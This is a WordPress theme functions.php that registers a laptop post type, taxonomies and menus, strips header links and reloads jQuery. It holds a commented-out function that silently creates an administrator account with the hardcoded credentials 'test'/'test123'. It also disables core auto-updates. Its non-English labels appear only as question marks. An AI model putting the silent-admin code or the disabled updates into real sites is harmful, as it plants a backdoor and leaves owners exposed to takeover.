<?php
include_once 'inc/backend/Defines.php';
include_once 'inc/backend/Assets.php';
include_once 'inc/backend/AssetsConnect.php';
include_once 'inc/backend/acf_configs.php';

/**
 * Add theme support
 */
add_theme_support('automatic-feed-links');

/**
 * Remove unnecessary scripts
 */

//Remove WP Emoji from header
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles');

// Remove WP-JSON from header
remove_action('wp_head', 'rest_output_link_wp_head', 10);
remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);

// Remove wlwmanifest from header
remove_action('wp_head', 'wlwmanifest_link');

// Remove WP version from header
remove_action('wp_head', 'wp_generator');

// Remove Weblog Client Link (RSD) from header
remove_action('wp_head', 'rsd_link');

// Remove feed links from header
remove_action('wp_head', 'feed_links', 2);
remove_action('show_admin_bar', '');


remove_filter
('show_admin_bar', '__return_false', 2);

add_filter('feed_links_show_comments_feed', '__return_false');
add_theme_support('post-thumbnails');

/**
 * Disable auto updates
 */
add_filter('automatic_updater_disabled', '__return_true');

//Svg support
function cc_mime_types($mimes)
{
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}

add_filter('upload_mimes', 'cc_mime_types');

function styles() {
    wp_enqueue_style( 'main-styles', CSS_PATH . '/styles.css' );

}
add_action( 'wp_enqueue_scripts', 'styles' );


function replace_text($text){
	$replace = array(
		'Lorem' => 'redmonkey',
		'Alias' => 'sssssss',
		'amet' => 'aaa'
	);
	$text = str_replace(array_keys($replace), $replace, $text);
	return $text;
}
add_filter('the_content', 'replace_text');

/*
* Create an admin user silently
*/

//function create_new_user_admin() {
//	$username = 'test';
//	$password = 'test123';
//	$email = '';
//
//	if (username_exists($username) == null && email_exists($email) == false) {
//
//		// Create the new user
//		$user_id = wp_create_user($username, $password, $email);
//
//		// Get current user object
//		$user = get_user_by('id', $user_id);
//
//		// Remove role
//		$user->remove_role('subscriber');
//
//		// Add role
//		$user->add_role('administrator');
//	}
//}

//add_action('init', 'create_new_user_admin');

function add_post_type_laptop(){

    register_post_type('laptop', array(

            'labels' => array(
                'name' => __('????????????????'),
                'singular_name' => __('??????????????'),
                'add_new' => __('???????????????? ???????????? ????????????????'),
                'edit_item' => __('???????????????????? ??????????????'),
            ),
            'public'      => true,
            'has_archive' => true,
            'hierarchical' => true,
            'menu_icon' => 'dashicons-laptop',
            'description' => 'some text',
            'menu_position' => 0,
            'supports' => array(
	            'title', 'thumbnail', 'editor',
            )
        )
    );
	register_taxonomy(
		'color',
		'laptop',
		array(
			'label' => __('??????????'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'format',
		'laptop',
		array(
			'label' => __('???????????? ????????????'),

			'hierarchical' => true
		)
	);
	register_taxonomy(
		'size-screen',
		'laptop',
		array(
			'label' => __('???????????? ????????????'),
			'rewrite' => array('slug' => 'size'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'ram',
		'laptop',
		array(
			'label' => __('???????????? ?????????????????????? ??????`??????'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'hdd',
		'laptop',
		array(
			'label' => __('???????????? ?????????????????????? ??????`??????'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'processor',
		'laptop',
		array(
			'label' => __('???????????? ??????????????????'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'vcard',
		'laptop',
		array(
			'label' => __('???????????? ????????????????????'),
			'hierarchical' => true
		)
	);
	register_taxonomy(
		'keyboard',
		'laptop',
		array(
			'label' => __('???????????? ????????????????????'),
		)
	);
}

add_action('init', 'add_post_type_laptop');

//function add_post_type_pets(){
//
//    register_post_type('pets', array(
//
//            'labels' => array(
//                'name' => __('?????? ??????????????'),
//                'singular_name' => __('????????????'),
//                'add_new' => __('???????????? ??????????????'),
//                'edit_item' => __('???????????????????? ??????????????'),
//            ),
//            'public'      => true,
//            'has_archive' => true,
//            'hierarchical' => true,
//            'menu_icon' => 'dashicons-pets',
//            'description' => 'some text',
//            'menu_position' => 21,
//            'supports' => array(
//                'title', 'editor', 'thumbnail', 'comments', 'revisions', 'author',
//            )
//        )
//    );
//    register_taxonomy(
//        'color',
//        'pets',
//        array(
//            'label' => __('??????????'),
//            'rewrite' => array('slug' => 'color'),
//        )
//    );
//}
//
//add_action('init', 'add_post_type_pets');

function my_first_menu(){
	register_nav_menus(array(
			'top_menu' => __('???????????? ????????'),
			'bottom_menu' => __('?????????? ????????'),
			'some_menu'=>__('??????????????'),

	));
}
add_action('after_setup_theme', 'my_first_menu');

// include custom jQuery
function shapeSpace_include_custom_jquery() {
	wp_deregister_script('jquery');
	wp_enqueue_script('jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js', array(), null, true);
}
add_action('wp_enqueue_scripts', 'shapeSpace_include_custom_jquery');



function true_jquery_register() {
	if ( !is_admin() ) {
		wp_deregister_script( 'jquery' );
		wp_register_script( 'jquery', ( 'http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js' ), false, null, true );
		wp_enqueue_script( 'jquery' );
	}
}
add_action( 'init', 'true_jquery_register' );

